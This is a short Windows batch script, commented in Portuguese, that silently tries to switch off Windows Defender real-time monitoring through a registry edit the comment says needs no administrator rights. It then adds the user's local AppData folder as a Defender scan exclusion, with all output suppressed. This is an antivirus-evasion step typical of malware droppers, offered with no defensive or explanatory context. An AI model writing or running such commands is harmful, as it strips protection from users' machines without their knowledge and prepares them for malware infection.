@echo off
:: Desativa o Windows Defender em tempo real (sem admin)
reg add "HKCU\Software\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
:: Adiciona exclusão para a pasta do usuário
powershell -Command "Add-MpPreference -ExclusionPath '%localappdata%'" >nul 2>&1
